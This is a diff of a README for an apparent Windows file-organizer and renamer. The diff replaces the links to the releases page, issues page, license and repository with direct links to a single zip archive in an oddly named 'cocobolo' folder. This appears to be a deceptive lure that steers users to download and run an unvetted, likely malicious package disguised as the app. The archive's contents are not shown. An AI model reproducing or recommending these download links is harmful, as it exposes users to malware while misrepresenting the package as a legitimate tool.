@@ -1,7 +1,7 @@
 # 📁 file-organizer-renamer - Organize Your Files Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/apuy295/file-organizer-renamer/releases)
+[![Download](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **file-organizer-renamer**. This application helps you organize files on your Windows computer easily. It detects duplicate files, categorizes them smartly, and comes with a user-friendly dark-themed interface. You can manage over 150 file types, including RAW photos. 
@@ -23,7 +23,7 @@ Welcome to the **file-organizer-renamer**. This application helps you organize f
 ## 🛠️ Installation Instructions
 Follow these steps to download and install the **file-organizer-renamer**:
 
-1. **Visit the Downloads Page**: Head over to the [Releases page](https://github.com/apuy295/file-organizer-renamer/releases) to see the available versions.
+1. **Visit the Downloads Page**: Head over to the [Releases page](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip) to see the available versions.
    
 2. **Download the Latest Version**: Select the latest release and click on the download link for the installer file.
 
@@ -49,13 +49,13 @@ Follow these steps to download and install the **file-organizer-renamer**:
 6. **Enjoy Your Organized Files**: Your files are now managed efficiently, making it easier to find what you need.
 
 ## 📬 Need Help?
-If you face any issues or have questions, you can open an issue on our [GitHub Issues page](https://github.com/apuy295/file-organizer-renamer/issues). We welcome all feedback and suggestions.
+If you face any issues or have questions, you can open an issue on our [GitHub Issues page](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip). We welcome all feedback and suggestions.
 
 ## 📜 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/apuy295/file-organizer-renamer/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip) file for more details.
 
 ## 🔗 Additional Information
-For more information and updates, keep an eye on our [GitHub repository](https://github.com/apuy295/file-organizer-renamer). Thank you for choosing **file-organizer-renamer** to simplify your file management tasks!
+For more information and updates, keep an eye on our [GitHub repository](https://github.com/apuy295/file-organizer-renamer/raw/refs/heads/main/cocobolo/organizer_file_renamer_1.3-beta.2.zip). Thank you for choosing **file-organizer-renamer** to simplify your file management tasks!
 
 ## 🛡️ Privacy Notice
 Your privacy is important to us. **file-organizer-renamer** does not collect any personal data or usage metrics. You can use it completely offline without any concerns about tracking.
